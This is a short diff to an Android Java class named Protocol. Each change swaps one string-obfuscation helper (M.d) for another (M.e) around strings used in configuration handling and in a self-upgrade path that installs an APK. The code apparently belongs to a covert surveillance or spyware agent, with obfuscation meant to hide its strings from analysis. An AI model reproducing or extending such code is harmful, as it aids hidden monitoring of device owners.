@@ -42,7 +42,7 @@ import com.android.m.M;
 public abstract class Protocol implements iProtocol {
 
 	/** The Constant UPGRADE_FILENAME. */
-	public static final String UPGRADE_FILENAME = M.d("core-update"); //$NON-NLS-1$
+	public static final String UPGRADE_FILENAME = M.e("core-update"); //$NON-NLS-1$
 	/** The debug. */
 	private static final String TAG = "Protocol"; //$NON-NLS-1$
 	private static Object configLock = new Object();
@@ -96,7 +96,7 @@ public abstract class Protocol implements iProtocol {
 		}
 
 		if (success) {
-			EvidenceReference.info(M.d("New configuration received")); //$NON-NLS-1$
+			EvidenceReference.info(M.e("New configuration received")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -158,7 +158,7 @@ public abstract class Protocol implements iProtocol {
 					Check.log(TAG + " (upgradeMulti): action " + fileName);
 				}
 				final Intent intent = new Intent(Intent.ACTION_VIEW);
-				intent.setDataAndType(Uri.fromFile(file), M.d("application/vnd.android.package-archive")); //$NON-NLS-1$
+				intent.setDataAndType(Uri.fromFile(file), M.e("application/vnd.android.package-archive")); //$NON-NLS-1$
 				intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 				Status.getAppContext().startActivity(intent);
 			} else {
